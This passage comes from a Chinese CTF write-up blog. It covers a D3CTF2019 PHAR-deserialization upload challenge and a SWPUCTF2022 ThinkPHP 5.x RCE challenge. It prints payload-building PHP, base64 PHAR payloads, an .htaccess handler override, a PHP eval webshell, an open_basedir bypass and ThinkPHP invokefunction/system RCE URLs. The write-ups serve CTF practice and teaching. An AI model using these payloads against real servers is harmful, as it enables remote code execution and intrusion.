&quot;</span>.<span class="variable language_">$this</span>-&gt;userdir;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename.<span class="string">&quot;.txt&quot;</span>, <span class="variable">$string</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dir</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&quot;upload&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$dir</span>-&gt;<span class="title function_ invoke__">upload</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&quot;remove&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$dir</span>-&gt;<span class="title function_ invoke__">remove</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&quot;count&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dir&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>-&gt;<span class="title function_ invoke__">count</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>-&gt;<span class="title function_ invoke__">count</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dir&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用post传入的 <code>url</code> 和 <code>filename</code> 创建dir对象</p>
<p>upload: </p>
<ol>
<li>目录检查：是否被改</li>
<li>url检查 ：必须包含scheme，且scheme不能包含 <code>file</code> 或 <code>php</code> ，但没有过滤 <code>data</code> 和 <code>phar</code> </li>
<li>文件名后缀检查：不能包含ph</li>
<li><code>file_get_contents</code> 获取url中的内容并过滤，<code>&lt;</code> 会被过滤，看来木马无法直接从内容上传</li>
<li><code>file_put_contents</code> 将内容存入userdir&#x2F;filename</li>
</ol>
<p>count:</p>
<p>展示上传目录文件数量，调用的话会发现文件会被定时删除</p>
<p><strong>phar反序列化</strong></p>
<blockquote>
<p>在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发</p>
</blockquote>
<p>phar文件为php归档文件，相当于压缩包，可以存放多个文件，在被某些触发函数解析时 其中的MetaData会自动被反序列化（漏洞）</p>
<p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件</strong></p>
<table>
<thead>
<tr>
<th align="center">触发函数（部分）</th>
<th align="center"></th>
<th align="center"></th>
<th align="center"></th>
</tr>
</thead>
<tbody><tr>
<td align="center">file_get_content</td>
<td align="center">filectime</td>
<td align="center">file_exists</td>
<td align="center">file_get_contents</td>
</tr>
<tr>
<td align="center">fileatime</td>
<td align="center">file_put_contents</td>
<td align="center">file</td>
<td align="center">filegroup</td>
</tr>
<tr>
<td align="center">fopen</td>
<td align="center">fileinode</td>
<td align="center">unlink</td>
<td align="center">stat</td>
</tr>
<tr>
<td align="center">fileowner</td>
<td align="center">fileperms</td>
<td align="center">is_dir</td>
<td align="center">is_executable</td>
</tr>
<tr>
<td align="center">is_file</td>
<td align="center">copy</td>
<td align="center">stat</td>
<td align="center">readfile</td>
</tr>
</tbody></table>
<ul>
<li><p><code>$string = &quot;your file in : &quot;.$this-&gt;userdir;</code> 有可能触发 <code>__toString</code>，查看目录信息</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$userdir</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot; __HALT_COMPILER(); &quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="comment">/**按照攻击链条构造对象***/</span></span><br><span class="line">   <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dir</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;userdir=<span class="string">&#x27;../&#x27;</span>;	</span><br><span class="line">   <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dir</span>();</span><br><span class="line">   <span class="variable">$o</span>-&gt;userdir=<span class="variable">$a</span>;</span><br><span class="line"><span class="comment">/***其余部分可作为模板***/</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将要反序列化的对象存入meta-data</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>

<p>执行后生成 <code>phar.phar</code>文件，改为<code>phar.gif</code> </p>
<p>上传脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getinfo</span>(<span class="params">purl, filename, action</span>):</span><br><span class="line">    post_data = &#123;<span class="string">&quot;url&quot;</span>: purl, <span class="string">&quot;filename&quot;</span>: filename, <span class="string">&quot;action&quot;</span>: action&#125;</span><br><span class="line">    response = requests.post(<span class="string">&quot;http://node2.anna.nssctf.cn:28055/&quot;</span>, data=post_data)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<p>可以用VPS上传至服务器，然后传</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getinfo(<span class="string">&#x27;http://xx.xx.xx.xx/phar.gif&#x27;</span>, <span class="string">&#x27;phar.gif&#x27;</span>, <span class="string">&#x27;upload&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>或直接获取base64编码然后用<code>data</code>伪协议上传</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">base64</span> phar.phar</span><br><span class="line">&lt; R0lGODlhIF9fSEFMVF9DT01QSUxFUigpOyA/Pg0KsgAAAAEAAAARAAAAAQAAAAAAfAAAAE86Mzoi</span><br><span class="line">ZGlyIjozOntzOjc6InVzZXJkaXIiO086MzoiZGlyIjozOntzOjc6InVzZXJkaXIiO3M6MzoiLi4v</span><br><span class="line">IjtzOjM6InVybCI7TjtzOjg6ImZpbGVuYW1lIjtOO31zOjM6InVybCI7TjtzOjg6ImZpbGVuYW1l</span><br><span class="line">IjtOO30IAAAAdGVzdC50eHQEAAAAZ5vUZAQAAAAMfn/YpAEAAAAAAAB0ZXN0blKehuzjSYAVLkjn</span><br><span class="line">JV2RJv5biehmVwrY/PBuUG3FIoQDAAAAR0JNQg==</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url=<span class="string">&#x27;&#x27;&#x27;data://image/gif;base64,R0lGODlhIF9fSEFMVF9DT01QSUxFUigpOyA/Pg0KsgAAAAEAAAARAAAAAQAAAAAAfAAAAE86Mzoi</span></span><br><span class="line"><span class="string">ZGlyIjozOntzOjc6InVzZXJkaXIiO086MzoiZGlyIjozOntzOjc6InVzZXJkaXIiO3M6MzoiLi4v</span></span><br><span class="line"><span class="string">IjtzOjM6InVybCI7TjtzOjg6ImZpbGVuYW1lIjtOO31zOjM6InVybCI7TjtzOjg6ImZpbGVuYW1l</span></span><br><span class="line"><span class="string">IjtOO30IAAAAdGVzdC50eHQEAAAAZ5vUZAQAAAAMfn/YpAEAAAAAAAB0ZXN0blKehuzjSYAVLkjn</span></span><br><span class="line"><span class="string">JV2RJv5biehmVwrY/PBuUG3FIoQDAAAAR0JNQg==&#x27;&#x27;&#x27;</span></span><br><span class="line">getinfo(url, <span class="string">&#x27;phar.gif&#x27;</span>, <span class="string">&#x27;upload&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>可以看到上传到目录 <code>upload/e0ee64a13ff7a0b04333c1d51fbbeadf</code></p>
</li>
<li><p>上传<code>.htaccess</code> </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getinfo(<span class="string">&#x27;data://text/plain;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0&#x27;</span>, <span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line"><span class="comment"># 内容为：AddHandler php7-script .txt</span></span><br><span class="line"><span class="comment"># 因为 &lt; 被过滤，这同样可以达到效果，将txt解释为php</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>现在有了phar文件，可以传phar:&#x2F;&#x2F;，在<code>file_get_contents</code>中触发反序列化</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getinfo(<span class="string">&#x27;phar://upload/e0ee64a13ff7a0b04333c1d51fbbeadf/phar.gif&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;upload&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>得到 <code>your file in : upload/e0ee64a13ff7a0b04333c1d51fbbeadfyour file in : . .. 887a185b1a408019your file in : ../</code></p>
<p>所以上传文件夹绝对路径为 <code>/var/html/www/887a185b1a408019/upload/e0ee64a13ff7a0b04333c1d51fbbeadf</code></p>
</li>
<li><p>现在还是通过反序列化使得此文件夹中某个文件包含木马</p>
<p>由</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$string</span> = <span class="string">&quot;your file in : &quot;</span>.<span class="variable language_">$this</span>-&gt;userdir;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename.<span class="string">&quot;.txt&quot;</span>, <span class="variable">$string</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可见<code>string</code> 和 <code>filename</code> 均可控，让 <code>string</code>中包含木马即可</p>
</li>
</ul>
<h3 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h3><ul>
<li><p>上传木马名称文件（文件名没有过滤那么严）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getinfo(<span class="string">&#x27;data://image/gif;base64,R0lG&#x27;</span>, <span class="string">&quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;.txt&quot;</span>, <span class="string">&#x27;upload&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>这时，当前文件夹下就包含有<code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;.txt</code>，再类似前步反序列化展示文件夹下内容，然后就写到txt文件中</p>
</li>
<li><p>phar构造</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$userdir</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot; __HALT_COMPILER(); &quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">   <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dir</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;userdir=<span class="string">&quot;/upload/e0ee64a13ff7a0b04333c1d51fbbeadf&quot;</span>;</span><br><span class="line">   <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dir</span>();</span><br><span class="line">   <span class="variable">$o</span>-&gt;userdir=<span class="variable">$a</span>;</span><br><span class="line">   <span class="variable">$o</span>-&gt;filename=<span class="string">&quot;/var/www/html/887a185b1a408019/upload/e0ee64a13ff7a0b04333c1d51fbbeadf/webshell&quot;</span>;	<span class="comment">//最后会生成webshell.txt</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将要反序列化的对象存入meta-data</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>与前面操作相同</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;&#x27;&#x27;data://image/gif;base64,R0lGODlhIF9fSEFMVF9DT01QSUxFUigpOyA/Pg0KLQEAAAEAAAARAAAAAQAAAAAA9wAAAE86Mzoi</span></span><br><span class="line"><span class="string">ZGlyIjozOntzOjc6InVzZXJkaXIiO086MzoiZGlyIjozOntzOjc6InVzZXJkaXIiO3M6NDA6Ii91</span></span><br><span class="line"><span class="string">cGxvYWQvZTBlZTY0YTEzZmY3YTBiMDQzMzNjMWQ1MWZiYmVhZGYiO3M6MzoidXJsIjtOO3M6ODoi</span></span><br><span class="line"><span class="string">ZmlsZW5hbWUiO047fXM6MzoidXJsIjtOO3M6ODoiZmlsZW5hbWUiO3M6Nzk6Ii92YXIvd3d3L2h0</span></span><br><span class="line"><span class="string">bWwvODg3YTE4NWIxYTQwODAxOS91cGxvYWQvZTBlZTY0YTEzZmY3YTBiMDQzMzNjMWQ1MWZiYmVh</span></span><br><span class="line"><span class="string">ZGYvd2Vic2hlbGwiO30IAAAAdGVzdC50eHQEAAAATurUZAQAAAAMfn/YpAEAAAAAAAB0ZXN0Nw1j</span></span><br><span class="line"><span class="string">IHqtIaW4cyxLqtXaivqqZtUhOAJTZ2M8GgeF7DoDAAAAR0JNQg==&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">getinfo(purl, <span class="string">&quot;phar2.gif&quot;</span>, <span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line">getinfo(<span class="string">&#x27;phar://upload/e0ee64a13ff7a0b04333c1d51fbbeadf/phar2.gif&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;upload&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>得到 <code>your file in : upload/e0ee64a13ff7a0b04333c1d51fbbeadfyour file in : . .. .htaccess 1 2 &lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;.txt ...</code> ，说明上传成功</p>
<p>再访问<code>887a185b1a408019/upload/e0ee64a13ff7a0b04333c1d51fbbeadf/webshell.txt</code>，连接蚁剑获得flag</p>
<p>直接post命令的话要进行还要绕过目录穿越限制</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h3><ul>
<li><p>直接在userdir处传木马</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$userdir</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dir</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;filename=<span class="string">&#x27;/var/www/html/887a185b1a408019/upload/e0ee64a13ff7a0b04333c1d51fbbeadf/webshell&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;userdir=<span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>;		</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>(); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&quot;__HALT_COMPILER();&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
</li>
<li><p>但 <code>&lt;</code> 会被过滤</p>
<p>phar协议能够解压zip,gzip等压缩包，因此gzip压缩一下,<code>gzip phar.phar</code>，然后同样两步上传，触发序列化</p>
<p>访问<code>887a185b1a408019/upload/e0ee64a13ff7a0b04333c1d51fbbeadf/webshell.txt</code></p>
</li>
</ul>

	
	</div>
  <a type="button" href="/2023/08/10/D3CTF2019-ezupload/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/07/27/SWPUCTF2022-ezrce-wp/" >SWPUCTF2022-ezrce-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-07-27
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2826">题目链接</a>  </p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>页面打开为空</p>
<p>访问<code>robots.txt</code> 有</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow:</span><br><span class="line">  -  /NSS/index.php/</span><br></pre></td></tr></table></figure>

<p>访问<code>/NSS/index.php/</code> ，页面显示</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">:)</span><br><span class="line"></span><br><span class="line">ThinkPHP V5</span><br><span class="line">十年磨一剑 - 为API开发设计的高性能框架</span><br><span class="line">[ V5.<span class="number">0</span> 版本由 七牛云 独家赞助发布 ]</span><br><span class="line"></span><br><span class="line">好熟悉的界面 似曾相识啊</span><br></pre></td></tr></table></figure>

<p>可见系统使用<code>ThinkPHP v5.0</code></p>
<h3 id="查询已知漏洞及攻击方式"><a href="#查询已知漏洞及攻击方式" class="headerlink" title="查询已知漏洞及攻击方式"></a>查询已知漏洞及攻击方式</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ searchsploit thinkphp</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                |  Path</span><br><span class="line">-------------------------------------------------------------- ---------------------------------</span><br><span class="line">ThinkPHP - Multiple PHP Injection RCEs (Metasploit)           | linux/remote/48333.rb</span><br><span class="line">ThinkPHP 2.0 - <span class="string">&#x27;index.php&#x27;</span> Cross-Site Scripting               | php/webapps/33933.txt</span><br><span class="line">ThinkPHP 5.0.23/5.1.31 - Remote Code Execution                | php/webapps/45978.txt		<span class="comment"># 选择这个</span></span><br><span class="line">ThinkPHP 5.X - Remote Command Execution                       | php/webapps/46150.txt</span><br><span class="line">-------------------------------------------------------------- ---------------------------------</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ searchsploit -p 45978.txt		<span class="comment"># -p 上面Path中的文件名</span></span><br><span class="line"></span><br><span class="line">Exploit: ThinkPHP 5.0.23/5.1.31 - Remote Code Execution</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/45978</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/php/webapps/45978.txt</span><br><span class="line">    Codes: N/A</span><br><span class="line"> Verified: False</span><br><span class="line">File Type: ASCII text</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /usr/share/exploitdb/exploits/php/webapps/45978.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit Title: ThinkPHP 5.x &lt; v5.0.23,v5.1.31 Remote Code Execution</span></span><br><span class="line"><span class="comment"># Date: 2018-12-11</span></span><br><span class="line"><span class="comment"># Exploit Author: VulnSpy</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://thinkphp.cn</span></span><br><span class="line"><span class="comment"># Software Link: https://github.com/top-think/framework/</span></span><br><span class="line"><span class="comment"># Version: v5.x below v5.0.23,v5.1.31</span></span><br><span class="line"><span class="comment"># CVE: N/A</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit</span></span><br><span class="line">http://server/public/index.php?s=/index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=php%20-r%20<span class="string">&#x27;phpinfo();&#x27;</span>		<span class="comment"># 明显第二个参数即为执行的命令</span></span><br></pre></td></tr></table></figure>

<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?s=/index/\think\app/invokefunction&amp;<span class="function"><span class="keyword">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span>[0]=<span class="title">system</span>&amp;<span class="title">vars</span>[1][]=<span class="title">ls</span> /</span></span><br><span class="line"><span class="function">?<span class="title">s</span>=/<span class="title">index</span>/\<span class="title">think</span>\<span class="title">app</span>/<span class="title">invokefunction</span>&amp;<span class="title">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span>[0]=<span class="title">system</span>&amp;<span class="title">vars</span>[1][]=<span class="title">cat</span> $(<span class="params">find / -name flag</span>)</span></span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/07/27/SWPUCTF2022-ezrce-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/07/26/UUCTF2022-ez-rce-wp/" >UUCTF2022-ez_rce-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-07-26
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3090">题目链接</a>   </p>
<p>页面内容</p>
